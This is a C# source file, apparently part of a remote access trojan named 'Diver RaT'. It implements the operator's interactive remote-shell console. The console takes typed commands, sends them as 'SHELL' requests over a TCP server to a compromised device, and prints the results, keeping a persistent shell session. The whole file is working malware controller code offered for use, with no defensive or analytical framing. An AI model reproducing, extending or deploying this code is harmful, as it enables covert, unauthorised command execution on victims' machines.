using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Diver_RaT
{
    public static class RemoteTerminal
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FreeConsole();

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        private static extern bool SetConsoleTitleW(string title);

        private delegate bool HandlerRoutine(uint dwCtrlType);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(HandlerRoutine handler, bool add);

        private static readonly HandlerRoutine IgnoreCtrlC = _ => true;

        public static void Open(TcpServer server, Device device)
        {
            var thread = new System.Threading.Thread(() => Run(server, device)) { IsBackground = true };
            thread.Start();
        }

        private static void Run(TcpServer server, Device device)
        {
            var hadConsole = GetConsoleWindow() != IntPtr.Zero;
            if (!hadConsole)
                AllocConsole();
            SetConsoleTitleW($"Diver RaT - Remote Shell - {device.ComputerName}");
            SetConsoleCtrlHandler(IgnoreCtrlC, true);

            try
            {
                using var input = new StreamReader(Console.OpenStandardInput(), Encoding.UTF8);
                using var output = new StreamWriter(Console.OpenStandardOutput(), Encoding.UTF8) { AutoFlush = true };

                output.WriteLine($"Remote shell - {device.ComputerName} ({device.IpAddress})");
                output.WriteLine("Type a command and press Enter. 'exit'/'quit' closes, 'clear' clears the screen.");
                output.WriteLine("The shell session is persistent - cd / export state is kept between commands.");
                output.WriteLine("");

                var prompt = $"{device.ComputerName}> ";
                while (true)
                {
                    output.Write(prompt);
                    var line = input.ReadLine();
                    if (line == null) break;
                    var cmd = line.Trim();
                    if (cmd.Equals("exit", StringComparison.OrdinalIgnoreCase) ||
                        cmd.Equals("quit", StringComparison.OrdinalIgnoreCase) ||
                        cmd.Equals("close", StringComparison.OrdinalIgnoreCase))
                        break;
                    if (cmd.Equals("clear", StringComparison.OrdinalIgnoreCase) ||
                        cmd.Equals("cls", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.Clear();
                        continue;
                    }
                    if (cmd.Length == 0) continue;

                    output.WriteLine();
                    var result = server.SendCommandAsync(device.Id, "SHELL",
                        new Dictionary<string, string> { ["cmd"] = cmd }).GetAwaiter().GetResult();
                    if (result.Success)
                        output.WriteLine(result.Result ?? "(no output)");
                    else
                        output.WriteLine($"[error] {result.Error}");
                    output.WriteLine();
                }

                output.WriteLine("Session closed.");
            }
            catch (Exception ex)
            {
                try
                {
                    using var output = new StreamWriter(Console.OpenStandardOutput(), Encoding.UTF8) { AutoFlush = true };
                    output.WriteLine("Terminal error: " + ex.Message);
                }
                catch { }
            }
            finally
            {
                if (!hadConsole)
                    FreeConsole();
            }
        }
    }
}